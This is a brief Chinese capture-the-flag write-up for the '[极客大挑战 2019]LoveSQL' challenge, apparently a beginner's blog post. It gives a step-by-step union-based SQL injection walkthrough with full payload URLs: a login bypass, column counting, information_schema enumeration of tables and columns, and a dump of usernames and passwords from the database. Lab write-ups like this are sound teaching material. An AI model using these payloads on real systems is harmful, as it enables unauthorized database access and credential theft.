新手上路——[极客大挑战 2019]LoveSQL

新手上路——[极客大挑战 2019]LoveSQL

看起来和easysql差不多的登录界面，直接试试我们的万能密码1' or 1=1#

得到一串比较惊喜的字符，然而md5解密失败，想得太天真。

接下来老老实实order by 猜字段数

/check.php?username=admin' order by 3%23&password=1

/check.php?username=admin' order by 4%23&password=1

说明有三个字段，接下来用union查询测试注入点。

/check.php?username=1' union select 1,2,3%23&password=1

测试出回显位置，在 2 和 3 字段回显数据，查询一下当前数据库名及版本

/check.php?username=1' union select 1,database(),version()%23&password=1

接下来开始我们的爆表、爆字段之旅

/check.php?username=1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1

的得到了上面两个表，接着查询

/check.php?username=1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’l0ve1ysq1’%23&password=1

接着对这三个字段查询

/check.php?username=1’ union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1

得到flag。
